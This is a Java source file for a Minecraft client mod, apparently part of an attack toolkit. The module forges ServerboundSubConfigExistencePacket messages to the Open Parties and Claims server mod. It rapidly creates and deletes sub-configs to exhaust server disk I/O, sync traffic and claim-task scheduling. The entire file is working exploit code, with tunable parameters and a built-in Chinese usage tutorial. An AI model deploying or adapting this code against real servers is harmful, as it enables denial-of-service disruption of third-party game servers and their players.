package com.redblue.red.modules.opac;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * OPAC-03: SubConfig Churn -- exploits weak single-tick rate limit on
 * ServerboundSubConfigExistencePacket (index 25).
 *
 * Rapidly creates and deletes sub-configs to cause:
 *   - Config object allocation + persistence I/O
 *   - Sync packets to player
 *   - On delete: claim replacement task scheduling
 *
 * Rate limited to 1 op/tick (20/sec), but each op involves disk I/O.
 */
public class OPAC03_SubConfigChurn implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("openpartiesandclaims", "main");
    private static final int IDX_SUB_CONFIG = 25;

    private long lastTick = 0;
    private int counter = 0;
    private boolean createPhase = true;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofInt("interval", "发包间隔 (tick)", 1, 1, 20),
        ConfigParam.ofString("sub_id_prefix", "子配置ID前缀", "atk_"),
        ConfigParam.ofInt("cycle_count", "循环ID数量", 5, 1, 50)
    );

    @Override public String id() { return "opac03_subconfig_churn"; }
    @Override public String name() { return "子配置抖动"; }
    @Override public String description() { return "快速创建/删除子配置造成持久化I/O压力"; }

    @Override
    public String getTutorial() {
        return "[原理]\n"
            + "ServerboundSubConfigExistencePacket (ID 25) 有单tick速率限制\n"
            + "但每次创建/删除都涉及磁盘持久化和同步\n"
            + "删除时还会触发领地替换任务调度\n"
            + "交替创建/删除同一批子配置可持续产生I/O压力\n\n"
            + "[使用方法]\n"
            + "1. 启用模块，自动交替创建/删除子配置\n"
            + "2. 受服务端子配置数量上限约束\n\n"
            + "[参数]\n"
            + "子配置ID前缀: 生成的子配置名称前缀\n"
            + "循环ID数量: 使用多少个不同的子配置ID循环";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("openpartiesandclaims");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        String prefix = getParam("sub_id_prefix").map(ConfigParam::getString).orElse("atk_");
        sendSubConfigPacket(prefix + "0", true);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        String prefix = getParam("sub_id_prefix").map(ConfigParam::getString).orElse("atk_");
        int cycleCount = getParam("cycle_count").map(ConfigParam::getInt).orElse(5);

        String subId = prefix + (counter % cycleCount);
        sendSubConfigPacket(subId, createPhase);

        counter++;
        if (counter % cycleCount == 0) {
            createPhase = !createPhase;
        }
    }

    private void sendSubConfigPacket(String subId, boolean create) {
        CompoundTag tag = new CompoundTag();
        tag.putString("subId", subId);
        tag.putString("type", "PLAYER");
        // owner omitted -> server uses player's own UUID
        tag.putBoolean("create", create);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_SUB_CONFIG);
            buf.writeNbt(tag);
        });
    }
}
